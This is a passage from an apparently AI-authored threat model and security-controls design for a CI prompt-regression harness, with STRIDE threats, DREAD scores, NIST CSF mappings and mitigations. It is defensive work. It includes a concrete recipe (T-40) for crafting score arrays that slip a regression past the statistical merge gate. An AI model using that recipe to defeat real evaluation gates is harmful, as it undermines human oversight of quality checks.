| T-38 | **I** Info Disclosure | Score distributions, p-values, and confidence intervals leaked in verbose logs or error messages could reveal information about proprietary evaluation criteria, agent quality thresholds, or competitive quality benchmarks. In an open-source context, individual score values are low sensitivity, but aggregate score distributions could reveal which agents are weakest or which criteria are most difficult to satisfy | L | L | Low | MC-38: Statistical engine log output uses structured logging with configurable verbosity levels. Default log level excludes raw score arrays (logs only summary statistics: mean, std, N). Debug-level logging that includes raw scores is disabled in CI by default and requires explicit `PROMPT_REGRESSION_DEBUG=true` environment variable. Score arrays in evaluation report artifacts use summary statistics unless Full tier requests detailed output. |
| T-39 | **D** DoS | Extremely large score arrays (N > 10,000) passed to the statistical engine cause excessive computation time for Wilcoxon test or Wilson CI calculation, blocking the CI pipeline. A malicious or misconfigured evaluation tier could produce arrays large enough to cause scipy to consume excessive memory or CPU. Additionally, pathological input distributions (e.g., arrays with extreme outliers requiring many tied-rank corrections) could amplify computation time beyond expected bounds | M (score array length is determined by the evaluation tier configuration; a misconfigured or tampered tier setting could produce arbitrarily large arrays without an explicit cap) | M | Medium | MC-39: Maximum score array length enforced (N <= 1,000 per metric per version); validated in `compare_versions` before any computation. Computation timeout of 30 seconds per statistical comparison call via signal-based timeout. Memory guard: estimated memory usage checked before computation (N * 8 bytes * 3 working arrays < 100MB). Exceeding limits raises `InvalidScoreArrayError` with diagnostic message. |
| T-40 | **E** Elevation | An attacker crafts score arrays that exploit a near-zero-variance condition to manipulate the Wilcoxon test into always returning `NO_REGRESSION` (p=1.0), effectively bypassing the CI gate. For example: version A scores = [0.50, 0.50, 0.50, ...] and version B scores = [0.49, 0.51, 0.49, 0.51, ...] produce paired differences that alternate sign and sum to near-zero, yielding a non-significant p-value despite version B having lower mean quality. This is an elevation of privilege because it allows a regressing prompt change to bypass the merge gate | M | H | **High** | MC-40: Variance floor enforcement: reject score arrays where IQR < 0.01 (indicating suspiciously uniform scores). Effect size check: when p > alpha (non-significant), compute Cohen's d between version A and B means; if |d| > 0.50 (medium effect) despite non-significant p-value, emit WARN verdict instead of PASS (underpowered test detection). Paired-difference symmetry check: if the signed rank sum is near zero but individual differences have high magnitude (mean |diff| > 0.05), flag as potential adversarial cancellation pattern and emit WARN. |

---

## Part 4: Security Controls Mapping

### 4.1 Controls Index

| Control ID | Control Name | Implementation Location | NIST CSF 2.0 Function |
|-----------|-------------|------------------------|----------------------|
| MC-01 | YAML schema validation (filename match) | `tests/prompt-regression/conftest.py` + JSON Schema file | PR.DS (Data Security) |
| MC-02 | Input sanitization for prompt injection | `jerry/testing/evaluation/deepeval_adapter.py` | PR.DS (Data Security) |
| MC-03 | Threshold enforcement via schema | `tests/prompt-regression/schemas/test-case.schema.json` | PR.IP (Information Protection) |
| MC-04 | Git audit trail for test changes | Git history + PR-based workflow (existing) | DE.AE (Adverse Events) |
| MC-05 | Sensitive data scan in test inputs | `.pre-commit-config.yaml` + YAML schema type constraints | PR.DS (Data Security) |
| MC-06 | Test case count and size limits | `tests/prompt-regression/conftest.py` validation | PR.IP (Information Protection) |
| MC-07 | Docker read-only + capability drop + path restriction | `docker/promptfoo/Dockerfile` + workflow YAML | PR.AC (Access Control) |
| MC-08 | Docker image digest pinning | `docker/promptfoo/Dockerfile` (FROM digest) | PR.DS (Data Security) |
| MC-09 | Output volume validation | `.github/workflows/prompt-regression-*.yml` post-step | PR.DS (Data Security) |
| MC-10 | Read-only config mounts | `.github/workflows/prompt-regression-*.yml` volume mounts | PR.AC (Access Control) |
| MC-11 | Container execution logging | GitHub Actions log capture (built-in) | DE.CM (Continuous Monitoring) |
| MC-12 | Single-process container, no shell | `docker/promptfoo/Dockerfile` (ENTRYPOINT, no CMD shell) | PR.AC (Access Control) |
| MC-13 | Docker resource limits | `.github/workflows/prompt-regression-*.yml` docker run flags | PR.IP (Information Protection) |
| MC-14 | Container hardening (no-new-privileges, cap-drop) | `.github/workflows/prompt-regression-*.yml` docker run flags | PR.AC (Access Control) |
| MC-15 | TLS-only API communication | Anthropic SDK default configuration | PR.DS (Data Security) |
| MC-16 | TLS integrity (transport-level) | Anthropic SDK default configuration | PR.DS (Data Security) |
| MC-17 | LLM response logging with request ID | `jerry/testing/evaluation/deepeval_adapter.py` | DE.AE (Adverse Events) |
| MC-18 | Provider data retention review | Operational procedure (documented in runbook) | ID.RA (Risk Assessment) |
| MC-19 | API retry with backoff + graceful degradation | `jerry/testing/evaluation/deepeval_adapter.py` | PR.IP (Information Protection) |
| MC-20 | Cost monitoring + budget ceiling | `.github/actions/cost-monitor/action.yml` | DE.CM (Continuous Monitoring) |
| MC-21 | No dynamic code execution on LLM responses | `jerry/testing/evaluation/metrics.py` (response treated as str) | PR.DS (Data Security) |
| MC-22 | Baseline quality gate enforcement | `jerry/testing/baselines/store.py` (store method validation) | PR.DS (Data Security) |
| MC-23 | Baseline tamper detection via git + anomaly detection | `jerry/testing/baselines/store.py` + baseline audit CLI | DE.AE (Adverse Events) |
| MC-24 | Baseline provenance in frozen dataclass | `jerry/testing/types.py` (BaselineRecord) | DE.AE (Adverse Events) |
| MC-25 | Baseline schema validation (no prompt content) | `jerry/testing/baselines/store.py` + pre-commit hook | PR.DS (Data Security) |
| MC-26 | Baseline retention policy (prune oldest) | `jerry/testing/baselines/store.py` (prune method) | PR.IP (Information Protection) |
| MC-27 | VersionKey path traversal prevention | `jerry/testing/types.py` (VersionKey validation) | PR.AC (Access Control) |
| MC-28 | Fork PR secret isolation | `.github/workflows/prompt-regression-*.yml` event type | PR.AC (Access Control) |
| MC-29 | CODEOWNERS for workflow files | `.github/CODEOWNERS` + branch protection rules | PR.AC (Access Control) |
| MC-30 | Evaluation result persistence (PR comment + artifact) | `.github/workflows/prompt-regression-*.yml` post-step | DE.AE (Adverse Events) |
| MC-31 | Log masking for secrets | `.github/workflows/prompt-regression-*.yml` `::add-mask::` | PR.DS (Data Security) |
| MC-32 | Workflow concurrency control | `.github/workflows/prompt-regression-*.yml` `concurrency:` key | PR.IP (Information Protection) |
| MC-33 | Minimal workflow permissions | `.github/workflows/prompt-regression-*.yml` `permissions:` block | PR.AC (Access Control) |
| MC-34 | Score provenance validation | `jerry/testing/stats.py` (VersionKey required on ScoreArray) | PR.DS (Data Security) |
| MC-35 | Adversarial score sequence detection | `jerry/testing/stats.py` (input validation) | PR.DS (Data Security) |
| MC-36 | n_metrics validation and cap | `jerry/testing/stats.py` (compare_versions validation) | PR.DS (Data Security) |
| MC-37 | Statistical comparison audit trail | `jerry/testing/stats.py` (structured result logging) + evaluation report artifacts | DE.AE (Adverse Events) |
| MC-38 | Score distribution log verbosity control | `jerry/testing/stats.py` (configurable log levels) | PR.DS (Data Security) |
| MC-39 | Score array size limits + computation timeout | `jerry/testing/stats.py` (input validation, signal timeout) | PR.IP (Information Protection) |
| MC-40 | Variance floor + effect size + paired-diff symmetry checks | `jerry/testing/stats.py` (adversarial input detection) | PR.AC (Access Control) |

### 4.2 DREAD Risk Scoring Matrix

For the 9 High-risk threats, DREAD provides quantified risk prioritization. Threats are ordered by DREAD score (descending), with a secondary ordering criterion (Integrity Impact Weight) applied as a tiebreaker to distinguish threats that undermine evaluation integrity from those causing operational disruption.

| Threat ID | Damage (1-10) | Reproducibility (1-10) | Exploitability (1-10) | Affected Users (1-10) | Discoverability (1-10) | DREAD Score | Integrity Impact Weight | Priority Score | Priority |
|-----------|--------------|----------------------|---------------------|---------------------|----------------------|-------------|------------------------|----------------|----------|
| T-19 | 5 | 9 | 9 | 8 | 9 | **8.0** | 0.0 | 8.0 | 1 |
| T-20 | 7 | 9 | 8 | 5 | 8 | **7.4** | 0.0 | 7.4 | 2 |
| T-02 | 8 | 7 | 6 | 8 | 7 | **7.2** | 1.0 | 8.2 | 3 |
| T-35 | 9 | 8 | 5 | 8 | 4 | **6.8** | 1.0 | 7.8 | 4 |
| T-29 | 9 | 6 | 5 | 9 | 5 | **6.8** | 0.5 | 7.3 | 5 |
| T-28 | 8 | 5 | 5 | 8 | 6 | **6.4** | 0.5 | 6.9 | 6 |
| T-40 | 8 | 6 | 5 | 8 | 4 | **6.2** | 1.0 | 7.2 | 7 |
| T-07 | 8 | 5 | 6 | 7 | 5 | **6.2** | 0.5 | 6.7 | 8 |
| T-22 | 8 | 6 | 5 | 8 | 4 | **6.2** | 1.0 | 7.2 | 9 |

**DREAD Score Computation:** Average of all 5 dimensions, each scored 1-10.

**Priority Ordering Methodology:** Priority is determined by a two-factor ordering:

1. **Primary factor: DREAD Score** (descending). Higher DREAD scores indicate greater overall risk.
2. **Secondary factor: Integrity Impact Weight** (applied as tiebreaker). When two threats have the same DREAD score, the one with higher Integrity Impact Weight is prioritized. The weight reflects whether the threat undermines the harness's core evaluation integrity:
   - **1.0** = Directly compromises evaluation integrity (e.g., score tampering, verdict manipulation). These threats are existential to the harness's purpose.
   - **0.5** = Partially compromises integrity or enables integrity attacks indirectly (e.g., workflow tampering enables secret exfiltration which enables score fabrication).
   - **0.0** = Causes operational disruption (availability, cost) without directly compromising evaluation integrity.

**Priority Score formula:** `Priority Score = DREAD Score + (Integrity Impact Weight * sign)` where `sign` is used to break ties in DREAD score. Threats are first sorted by DREAD Score descending; within the same DREAD score band, Integrity Impact Weight determines ordering. When Priority Scores are equal (T-40 and T-22, both 7.2), the more upstream threat (T-40, statistical engine) is prioritized over the downstream threat (T-22, baseline store) because statistical engine compromise affects all downstream operations.

**DREAD Dimension Scoring Rationale (All 9 High-Risk Threats):**

| Threat | Dimension | Score | Rationale |
|--------|-----------|-------|-----------|
| T-19 (API DoS) | Damage | 5 | Blocks PR merges temporarily but causes no data corruption or integrity loss |
| T-19 (API DoS) | Reproducibility | 9 | API rate limits are deterministic; sending N requests above the rate limit always triggers throttling |
| T-19 (API DoS) | Exploitability | 9 | No special access required; normal evaluation workload can trigger rate limits |
| T-19 (API DoS) | Affected Users | 8 | All developers with open PRs are blocked when the API is unavailable |
| T-19 (API DoS) | Discoverability | 9 | API rate limits are publicly documented; cost structure is well-known |
| T-20 (Cost DoS) | Damage | 7 | Financial loss from token consumption; higher than T-19 because cost cannot be reversed |
| T-20 (Cost DoS) | Reproducibility | 9 | Misconfigured N or tier reliably produces excessive costs; deterministic |
| T-20 (Cost DoS) | Exploitability | 8 | Requires only modifying the workflow or config to increase N or disable budget ceiling |
| T-20 (Cost DoS) | Affected Users | 5 | Primarily affects repository owner (budget holder); does not block other PRs |
| T-20 (Cost DoS) | Discoverability | 8 | Cost-per-run is documented in ADR-001; attack surface is well-understood |
| T-02 (YAML injection) | Damage | 8 | Manipulated LLM outputs directly bias evaluation scores, producing false verdicts |
| T-02 (YAML injection) | Reproducibility | 7 | Injection payloads require per-model tuning; not guaranteed 100% reproduction |
| T-02 (YAML injection) | Exploitability | 6 | Requires knowledge of promptfoo's YAML format and effective injection payloads |
| T-02 (YAML injection) | Affected Users | 8 | All consumers of the evaluation results (developers, CI gate, baseline store) |
| T-02 (YAML injection) | Discoverability | 7 | YAML files are in the repository; injection techniques are well-documented |
| T-35 (Adversarial score sequences) | Damage | 9 | Directly compromises evaluation integrity; false PASS verdicts allow regressions to merge |
| T-35 (Adversarial score sequences) | Reproducibility | 8 | Crafting constant or zero-difference arrays is deterministic once the attacker understands the Wilcoxon test |
| T-35 (Adversarial score sequences) | Exploitability | 5 | Requires knowledge of the statistical methodology and ability to influence score generation; not trivial |
| T-35 (Adversarial score sequences) | Affected Users | 8 | All consumers of the CI gate rely on verdict integrity; a bypassed gate affects all downstream decisions |
| T-35 (Adversarial score sequences) | Discoverability | 4 | Requires reading the stats.py implementation to identify exploitable patterns; not surface-level |
| T-29 (Workflow secret exfiltration) | Damage | 9 | Exfiltrated API key enables unlimited API access and cost; requires immediate key rotation |
| T-29 (Workflow secret exfiltration) | Reproducibility | 6 | Requires PR with workflow modification; depends on branch protection configuration being bypassable |
| T-29 (Workflow secret exfiltration) | Exploitability | 5 | Requires submitting a PR with workflow changes that pass CODEOWNERS review or exploit a misconfiguration |
| T-29 (Workflow secret exfiltration) | Affected Users | 9 | Compromised API key affects all evaluation runs across the entire repository |
| T-29 (Workflow secret exfiltration) | Discoverability | 5 | GitHub Actions secret exfiltration is a well-known attack vector but requires understanding the specific workflow |
| T-28 (Fork PR secret access) | Damage | 8 | Fork PR gaining secret access enables API key exfiltration and unauthorized LLM calls |
| T-28 (Fork PR secret access) | Reproducibility | 5 | Depends on misconfiguration (using `pull_request_target` instead of `pull_request`); not always reproducible |
| T-28 (Fork PR secret access) | Exploitability | 5 | Requires opening a PR from a fork and workflow using the vulnerable event type |
| T-28 (Fork PR secret access) | Affected Users | 8 | All repository secrets are exposed; affects entire project security posture |
| T-28 (Fork PR secret access) | Discoverability | 6 | `pull_request_target` vs `pull_request` confusion is well-documented in GitHub security advisories |
| T-40 (Near-zero-variance bypass) | Damage | 8 | Allows regressing prompts to bypass the merge gate; evaluation integrity fully undermined |
| T-40 (Near-zero-variance bypass) | Reproducibility | 6 | Requires precise score array construction; alternating-sign paired differences reliably produce p=1.0 |
| T-40 (Near-zero-variance bypass) | Exploitability | 5 | Requires deep understanding of Wilcoxon signed-rank test mechanics and ability to influence score generation |
| T-40 (Near-zero-variance bypass) | Affected Users | 8 | All downstream consumers trust the PASS verdict; silent regression propagates to production |
| T-40 (Near-zero-variance bypass) | Discoverability | 4 | Requires statistical knowledge to identify the attack vector; not discoverable through surface inspection |
| T-07 (promptfoo file:// exploit) | Damage | 8 | Arbitrary file read within Docker container; could expose mounted secrets or test data |
| T-07 (promptfoo file:// exploit) | Reproducibility | 5 | Depends on promptfoo version supporting `file://` protocol and specific container mount configuration |
| T-07 (promptfoo file:// exploit) | Exploitability | 6 | Requires knowledge of promptfoo's YAML processing and `file://` handler; documented in promptfoo docs |
| T-07 (promptfoo file:// exploit) | Affected Users | 7 | Affects the evaluation pipeline and potentially exposes mounted test data and agent definitions |
| T-07 (promptfoo file:// exploit) | Discoverability | 5 | promptfoo's protocol handlers are documented; container mount points visible in workflow YAML |
| T-22 (Fake baseline records) | Damage | 8 | Inflated baselines make all future regressions undetectable; silently degrades quality over time |
| T-22 (Fake baseline records) | Reproducibility | 6 | Requires creating a valid-looking BaselineRecord with inflated scores and getting it merged via PR |
| T-22 (Fake baseline records) | Exploitability | 5 | Requires passing quality gate check and PR review; social engineering or compromised reviewer needed |
| T-22 (Fake baseline records) | Affected Users | 8 | All future regression comparisons against this agent are compromised; affects all PR evaluations |
| T-22 (Fake baseline records) | Discoverability | 4 | Baseline inflation requires understanding the BaselineRecord schema and quality gate bypass mechanics |

### 4.3 Security Controls by Implementation Phase

Controls mapped to ADR-001 implementation roadmap phases for delivery sequencing.

| Phase | Controls Implemented | Rationale |
|-------|---------------------|-----------|
| **A: Foundation** | MC-07, MC-08, MC-10, MC-12, MC-13, MC-14 (Docker hardening); MC-28, MC-29, MC-33 (GHA permissions); MC-27 (path traversal); MC-15, MC-16 (TLS) | Foundation phase establishes the secure execution environment. All container and workflow security controls must be in place before any evaluation runs. |
| **B: Statistical Layer** | MC-34, MC-35, MC-36, MC-37, MC-38, MC-39, MC-40 (statistical input validation and audit trail); MC-22, MC-23, MC-24, MC-25, MC-26 (baseline integrity) | Statistical engine must validate inputs before producing verdicts. Baseline store integrity must be established before baselines are captured. All 7 AS-6 controls (MC-34 through MC-40) are implemented here because the statistical engine is the first component to process score data. |
| **C: Debiasing** | MC-02 (input sanitization, extended to debiasing context); MC-17 (response logging); MC-21 (no dynamic execution) | Debiasing phase adds LLM-as-Judge, requiring response handling security. |
| **D: Metamorphic** | MC-01, MC-03, MC-05, MC-06 (YAML validation, expanded for MR test cases) | MR test cases introduce additional YAML input surfaces that require the same validation controls. |
| **E: Baseline Quality** | MC-22 (baseline quality gate -- enforcement hardened); MC-23 (audit CLI) | Baseline quality gate moves from advisory to enforced. |
| **Ongoing** | MC-04 (git audit trail); MC-09 (output validation); MC-11 (logging); MC-18 (data retention review); MC-19, MC-20 (cost/availability); MC-30, MC-31, MC-32 (GHA operational) | Operational controls maintained throughout lifecycle. |

---

## L2: Strategic Implications

### Long-Term Architectural Evolution

The hexagonal architecture enables three evolution paths without refactoring the domain core:

1. **Evaluation backend swap.** If DeepEval is deprecated or a superior alternative emerges (e.g., Anthropic releases a native evaluation SDK), only the `deepeval_adapter.py` adapter needs replacement. The `EvaluationPort` protocol, domain metrics, and all downstream layers remain unchanged. The security controls on the evaluation adapter (MC-02, MC-17, MC-21) transfer to any new adapter implementation.

2. **CI/CD layer replacement.** If promptfoo is superseded, the Docker container and workflow YAML are the only components affected. The domain core, statistical engine, and metamorphic relations are decoupled. The container hardening controls (MC-07 through MC-14) apply to any containerized replacement.

3. **Statistical method upgrade.** PROJ-017's BCa bootstrap and this project's Wilcoxon test coexist in `stats.py`. Future methods (PPI calibration from ADR-001 Phase E; permutation tests) are additive -- they extend `stats.py` without modifying existing functions. The input validation controls (MC-34, MC-35, MC-36) and the new audit trail controls (MC-37 through MC-40) apply uniformly to all statistical methods.

### Security Posture Trade-Offs

| Decision | Security Gained | Security Cost |
|----------|----------------|---------------|
| Docker isolation for promptfoo | Eliminates npm supply chain risk to host; prevents container escape via capability dropping | Adds Docker image as a new supply chain dependency; image digest must be maintained |
| GHA secrets for API keys | Keys never in code, never in YAML, never in git; auto-masked in logs | Keys available to all workflows in the repository; a compromised workflow could exfiltrate (mitigated by MC-29) |
| Baseline quality gate | Prevents regression against known-bad baselines | Adds friction to baseline capture workflow; requires quality gate infrastructure |
| Input validation on statistical engine | Catches adversarial score sequences; detects variance floor violations and paired-difference cancellation patterns | May reject legitimate edge cases (e.g., naturally low-variance scores for well-calibrated agents); requires calibration of thresholds (IQR < 0.01 floor, mean |diff| > 0.05 symmetry check) |
| Read-only mounts for all config | Prevents runtime config tampering | Requires all configuration to be determined before container launch; no dynamic reconfiguration |
| Statistical comparison audit trail (MC-37) | Full reproducibility of every verdict; enables post-hoc dispute resolution | Increases storage requirements for evaluation artifacts; adds structured logging overhead |

### NIST CSF 2.0 Alignment Summary

| CSF Function | Coverage | Key Controls |
|-------------|----------|-------------|
| **Identify (ID)** | ID.AM: Asset inventory (6 attack surfaces documented). ID.RA: Risk assessment (40 threats, STRIDE + DREAD). | Threat model, attack surface map |
| **Protect (PR)** | PR.AC: Access control (Docker hardening, GHA permissions, path traversal prevention, variance floor enforcement). PR.DS: Data security (TLS, input sanitization, schema validation, secret masking, log verbosity control). PR.IP: Information protection (resource limits, retention policies, concurrency control, computation timeouts). | MC-07 through MC-14, MC-27, MC-28, MC-33, MC-38, MC-39, MC-40 |
| **Detect (DE)** | DE.CM: Continuous monitoring (cost monitoring, container logging). DE.AE: Adverse events (baseline anomaly detection, evaluation result persistence, audit trail, statistical comparison audit trail). | MC-11, MC-17, MC-20, MC-23, MC-30, MC-37 |
| **Respond (RS)** | Graceful degradation on API failure (MC-19); budget exceeded auto-termination (MC-20); human escalation on persistent failures; WARN verdict on underpowered tests (MC-40). | MC-19, MC-20, MC-40 |
| **Recover (RC)** | Baseline retention policy enables rollback (MC-26); evaluation artifacts enable re-execution; ephemeral GHA runners provide clean-state recovery. | MC-26, GHA architecture |

### Integration Considerations with Existing Systems

1. **PROJ-017 Shared Infrastructure.** The `jerry/testing/stats.py` module is the primary integration point. Both projects must coordinate on the `ScoreArray` type definition and the shared module's import structure. The `stats.py` module MUST remain domain-pure (H-07) to serve both consumers. Any change to `stats.py` public signatures requires coordination across both projects.

2. **Jerry Quality Gate Framework.** The harness's statistical engine (Wilcoxon, Wilson) addresses the "statistical debt" pattern identified in ADR-001 L2. Long-term, the same statistical methods should be generalized to Jerry's S-014 LLM-as-Judge scoring, providing confidence intervals on quality gate scores instead of point estimates.

3. **Agent Development Workflow.** The harness integrates into the agent definition development cycle: edit agent `.md` file -> create PR -> Smoke tier runs automatically -> if agent definition changed, Standard tier runs -> developer reviews regression report -> merge or iterate. This workflow must be documented in the agent development standards.

---

## Self-Review (S-010)

Applied per H-15 before finalization. Iteration 3 self-review.

- [x] **Architecture covers all 4 layers with clear boundaries:** Layer 1 (CI/CD gate), Layer 2 (evaluation backend), Layer 3 (metamorphic relations), Layer 4 (statistical engine) each have dedicated module directories with explicit boundary definitions.
- [x] **All interfaces specified with data types:** 10 domain types defined in `types.py`; 3 port protocols defined (EvaluationPort, BaselinePersistencePort, ReportOutputPort); external interfaces documented (GHA, Docker, pytest, API keys).
- [x] **STRIDE analysis covers all 6 attack surfaces with all 6 STRIDE categories:** 40 threats identified across YAML test cases (7), Docker container (7), LLM API (7), baseline store (6), GitHub Actions (6), and statistical engine (7). All 6 STRIDE categories (S, T, R, I, D, E) are represented per attack surface.
- [x] **Every threat has a mitigation control:** 40 controls mapped (MC-01 through MC-40), each with implementation location and NIST CSF 2.0 function.
- [x] **Hexagonal architecture enforces dependency inversion (H-07):** Domain core modules import only from each other and stdlib/math libraries. Adapters depend on domain. Domain never depends on adapters. Forbidden dependencies explicitly listed.
- [x] **Module decomposition follows one-class-per-file (H-10):** 14 domain/adapter classes mapped to 14 distinct files. Each file's single responsibility documented.
- [x] **Navigation table present (H-23) with anchor links (NAV-006):** Document Sections table at top with 8 anchored entries.
- [x] **All type definitions include type hints (H-11):** All function signatures in interface contracts include complete type annotations and docstrings.
- [x] **DREAD scoring applied to high-risk threats:** 9 High-risk threats scored across 5 DREAD dimensions with mechanical priority ordering (DREAD + Integrity Impact Weight).
- [x] **Security controls mapped to implementation phases:** Controls sequenced against ADR-001 roadmap phases A through E. Phase B expanded to include MC-37 through MC-40.
- [x] **Shared module interface compatible with PROJ-017:** `stats.py` provides both Wilcoxon (PROJ-035) and BCa bootstrap (PROJ-017) entry points on the same `ScoreArray` type.
- [x] **Trust boundaries explicitly identified:** 5 trust boundaries documented with data flows crossing each boundary.
- [x] **pytest fixtures fully implemented:** All 6 fixtures in conftest.py have concrete implementations with environment variable resolution, debiasing configuration, and test isolation.
- [x] **MR tolerance values specified:** All 5 metamorphic relations have explicit tolerance values with derivation rationale and calibration methodology.
- [x] **DREAD priority ordering mechanically derived:** Priority Score = DREAD Score + Integrity Impact Weight, producing a deterministic ordering. Tiebreaker rule documented.
- [x] **Smoke tier bypass clarified:** EvaluationTier.SMOKE documented as bypassing the statistical engine entirely, not running with N=1.
- [x] **Likelihood justifications provided for High-rated threats:** Per-threat likelihood rationale included in STRIDE tables for all threats rated Likelihood=H or with Impact=H.
- [x] **Likelihood justifications provided for Medium-rated threats:** Inline parenthetical justifications added for all Medium-likelihood threats across all 6 attack surfaces, explaining why each threat is rated Medium rather than Low or High.
- [x] **DREAD dimension rationale covers all 9 High-risk threats:** Per-dimension scoring rationale table expanded from top 3 (T-19, T-20, T-02) to all 9 High-risk threats (adding T-35, T-29, T-28, T-40, T-07, T-22).
- [x] **External security references cited:** Evidence traceability table includes ET-15 (CIS Docker Benchmark v1.6), ET-16 (NIST SP 800-190), ET-17 (OWASP CI/CD Top 10), ET-18 (GitHub Actions Security Hardening), cross-referenced to specific mitigation controls.

---

## Evidence Traceability

| Evidence ID | Source | Specific Location | Design Element Supported |
|-------------|--------|-------------------|-------------------------|
| ET-01 | ADR-001 L1: Technical Implementation | Architecture Diagram | System context diagram, layer pipeline |
| ET-02 | ADR-001 L1: Technical Implementation | Component Integration Patterns | Layer 1+2, 2+3, 2+4 integration design |
| ET-03 | ADR-001 L1: Technical Implementation | Code patterns (ParaphraseConsistencyMetric, compare_versions) | Interface contracts, type definitions |
| ET-04 | ADR-001 L1: Decision | Layer table (promptfoo MIT, DeepEval Apache 2.0, scipy BSD) | Module decomposition, external dependencies |
| ET-05 | ADR-001 L1: Consequences | Negative #2 (Node.js dependency, Docker mitigation) | Docker container design, MC-07 through MC-14 |
| ET-06 | ADR-001 L1: Risks | FM-001 through FM-010 FMEA table | Threat model cross-reference, control phasing |
| ET-07 | ADR-001 L1: Technical Implementation | Test Case Definition Format (YAML) | Attack Surface 1, YAML validation controls |
| ET-08 | ADR-001 L1: Technical Implementation | Tiered Evaluation Modes (Smoke/Standard/Full) | EvaluationTier type, cost controls (MC-20) |
| ET-09 | ADR-001 L1: PROJ-017 Relationship | Shared Infrastructure section | stats.py shared interface design |
| ET-10 | ADR-001 L2: Architectural Implications | Systemic Pattern A (statistical debt) | L2 integration considerations |
| ET-11 | PROJ-036 Orchestration Plan | Stream 1B specification | Scope definition, agent assignment, deliverable path |
| ET-12 | `.context/rules/architecture-standards.md` (H-07), `.context/rules/coding-standards.md` (H-11), `.context/rules/quality-enforcement.md` (H-10, H-05, H-20) | H-07 domain isolation, H-10 one-class-per-file, H-11 type hints + docstrings, H-05 UV-only, H-20 BDD test-first | Architecture constraints applied to module decomposition and interface contracts |
| ET-13 | ADR-001 L2: Identified Gaps | Phase 1A L2 Gap #1 (oracle problem for evaluating LLM outputs); Phase 3 PAT-001 (metamorphic testing pattern for oracle-free validation) | Selection of MR-001 through MR-005 as oracle-free validation mechanisms; tolerance calibration methodology derived from ADR-001's analysis of LLM-as-Judge variance |
| ET-14 | ADR-001 L1: Consequences Negative #2 + FM-001 FMEA entry | "Node.js dependency introduces npm supply chain risk; mitigated by Docker isolation" (Consequences); FM-001: "Supply chain compromise in promptfoo npm dependencies" (FMEA) | Docker security controls MC-07 through MC-14; container hardening rationale; security-opt and cap-drop selections |
| ET-15 | CIS Docker Benchmark v1.6 | Section 4 (Container Images and Build File), Section 5 (Container Runtime Configuration): 5.1 (AppArmor), 5.2 (SELinux), 5.4 (privileged), 5.7 (host devices), 5.12 (read-only root filesystem), 5.25 (restrict capabilities) | Docker container hardening controls MC-07 (read-only + cap-drop), MC-08 (image pinning), MC-10 (read-only mounts), MC-12 (single-process, no shell), MC-13 (resource limits), MC-14 (no-new-privileges, cap-drop, non-root user) |
| ET-16 | NIST SP 800-190 (Application Container Security Guide) | Section 3 (Container Technology Architecture), Section 4 (Major Risks), Section 5 (Countermeasures): 5.1 (image vulnerabilities), 5.2 (image misconfigurations), 5.3 (runtime protections), 5.4 (host OS hardening) | Container threat model rationale for AS-2 (Docker container attack surface); security controls MC-07 through MC-14; ephemeral runner architecture alignment with SP 800-190 Section 5.3 recommendations |
| ET-17 | OWASP CI/CD Top 10 (2023) | CICD-SEC-1 (Insufficient Flow Control), CICD-SEC-2 (Inadequate Identity and Access Management), CICD-SEC-4 (Poisoned Pipeline Execution), CICD-SEC-7 (Insecure System Configuration) | GitHub Actions workflow security controls MC-28 (fork isolation, CICD-SEC-1), MC-29 (CODEOWNERS for workflow files, CICD-SEC-4), MC-33 (minimal permissions, CICD-SEC-2), MC-31 (secret masking, CICD-SEC-7); AS-5 threat model coverage aligns with OWASP CI/CD risk categories |
| ET-18 | GitHub Actions Security Hardening (docs.github.com) | Security hardening best practices: using `pull_request` vs `pull_request_target`, secret management, `GITHUB_TOKEN` permissions, third-party action pinning, CODEOWNERS enforcement | MC-28 (pull_request event type selection per GitHub hardening guide), MC-29 (CODEOWNERS + branch protection), MC-31 (secret masking via `::add-mask::`), MC-33 (minimal permissions block); workflow interface contract (section 2.3) follows GitHub's recommended permission model |

---

*System design produced: 2026-03-07 (iteration 3)*
*Agent: eng-architect (Stream 1B, PROJ-036 FEAT-036-001)*
*Source ADR: ADR-001-test-harness-architecture.md (ACCEPTED)*
*Threat model methodology: STRIDE (all 6 categories per surface) + DREAD (all 9 High-risk threats with full dimension rationale)*
*Threats identified: 40 across 6 attack surfaces (7 + 7 + 7 + 6 + 6 + 7)*
*Mitigation controls: 40 (MC-01 through MC-40)*
*External security references: CIS Docker Benchmark v1.6, NIST SP 800-190, OWASP CI/CD Top 10, GitHub Actions Security Hardening*
*NIST CSF 2.0 functions covered: Identify, Protect, Detect, Respond, Recover*
*Evidence traceability entries: 18 (ET-01 through ET-18)*
*Confidence: HIGH for architecture and interface design; HIGH for threat identification; HIGH for DREAD scoring (full dimension rationale for all 9 High-risk threats); MEDIUM for MR tolerance values (requires empirical calibration)*
